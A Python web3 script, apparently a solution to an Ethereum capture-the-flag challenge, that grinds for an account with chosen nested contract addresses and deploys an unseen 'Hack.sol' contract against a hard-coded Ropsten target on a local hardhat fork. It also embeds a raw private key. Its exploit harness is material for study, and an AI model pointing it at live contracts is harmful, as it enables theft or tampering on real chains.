from web3 import Web3, Account
import web3
from solcx import compile_files
from eth_tester import PyEVMBackend
import eth_abi
import rlp
import eth_keys
from eth_keys.backends.native.ecdsa import encode_raw_public_key
from eth_keys.backends.native.jacobian import fast_multiply
import random
import time

# My transaction
# 0x7a1d133d8476113fa28ef8e28cb79fd50151f58aceaee5f03eb642c3862ff59a

# Some constants
IS_TEST = True
TARGET = "0x168892cb672A747F193eb4acA7b964bfb0aA6476"
ARCHIVE_URL = "https://eth-ropsten.alchemyapi.io/v2/********************"


def mk_contract_address(sender, nonce):
    return Web3.sha3(rlp.encode([Web3.toBytes(hexstr=sender), nonce]))[12:]

def gen_account():
    priv_key = b'\xf5oI\x17\xf7\xd6\xac\r[\xf1\x0f\xe8\xa0\xa4{\x84R\x89\x11BVG\xb5\xb0\xe7\xeaV\xd2\x00V\xbf_'
    #b's|\x99\xf3":\x02\x01\xb1\x9e\x12\x8a\xc2\x17\xed\xbd\x80\xe0\xd1\x96\xc6\xe0\xda\xc0\xfa\x1d\t\x07*\x83\x1d\x03'
    return Account.from_key(priv_key)

    tries = 0
    while True:
        account = Account.create()
        contract_address1 = mk_contract_address(account.address, 0)

        contract_address2 = mk_contract_address(Web3.toHex(contract_address1), 1)
        if not contract_address2.hex().endswith('111'):
            continue

        tries += 1
        print(tries)
        contract_address3 = mk_contract_address(Web3.toHex(contract_address1), 2)
        if contract_address3.hex().endswith('111'):
            print(account.key)
            return account

def get_max_priority_fee(w3):
    try:
        return w3.eth.maxPriorityFeePerGas
    except:
        fee_hist = w3.eth.fee_history(1,'latest',[10])
        return fee_hist['reward'][-1][0]

def get_max_fee(w3):
    return get_max_priority_fee(w3) + (
        int(1.5 * w3.eth.get_block('latest')['baseFeePerGas'])
    )

_nonces = {}
_chain_ids_cache = {}
def sign_and_send_transaction(w3, account, tx):
    global _nonces
    if 'gas' not in tx:
        tx['gas'] = int(w3.eth.estimate_gas(tx) * 1.03)

    if 'gasPrice' not in tx and 'accessList' not in tx:
        if 'maxFeePerGas' not in tx:
            tx['maxFeePerGas'] = get_max_fee(w3)
        if 'maxPriorityFeePerGas' not in tx:
            tx['maxPriorityFeePerGas'] = get_max_priority_fee(w3)

    if 'nonce' not in tx:
        if account.address not in _nonces:
            _nonces[account.address] = w3.eth.getTransactionCount(account.address)
        tx['nonce'] = _nonces[account.address]
    else:
        _nonces[account.address] = tx['nonce']

    _nonces[account.address] += 1

    if w3 not in _chain_ids_cache:
        _chain_ids_cache[w3] = w3.eth.chain_id
    tx['chainId'] = _chain_ids_cache[w3]

    signed = Account.sign_transaction(tx, account.key)
    tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)

# Select RPC provider
if IS_TEST:
    rpc = "http://localhost:8545/"
else:
    rpc = "https://ropsten.infura.io/v3/************************"

# Get web3 instance
w3 = Web3(Web3.HTTPProvider(rpc))

# Patch eth_maxPriorityFeePerGas, often not supported
web3.eth.Eth.max_priority_fee = get_max_priority_fee(w3)

# Generate a valid account
account = gen_account()

# Setup environment
if IS_TEST:
    w3.provider.make_request('hardhat_reset', 
        [{'forking': {'jsonRpcUrl': ARCHIVE_URL, 'blockNumber': 11836555}}]
    )
    w3.provider.make_request('hardhat_setBalance', 
        [account.address, hex(Web3.toWei(1, 'ether'))]
    )
else:
    pass

print(f"Balance {account.address}: {w3.eth.get_balance(account.address)}")

# Deploy our contract
compiled = compile_files(["Hack.sol"], output_values=["abi", "bin"])['Hack.sol:Deploy']
Hack = w3.eth.contract(abi=compiled['abi'], bytecode=compiled['bin'])
tx = Hack.constructor(TARGET).buildTransaction({
    'from': account.address, 
})
print(tx)
tx_receipt = sign_and_send_transaction(w3, account, tx)

print(f"Account: {account.address}")
print(f"Deploy: {tx_receipt['contractAddress']}")
A = '0x'+tx_receipt['logs'][0]['data'][-40:]
print(f"A: {A}")
B = '0x'+tx_receipt['logs'][1]['data'][-40:]
print(f"B: {B}")
print(len(tx_receipt['logs']))
print(tx_receipt)
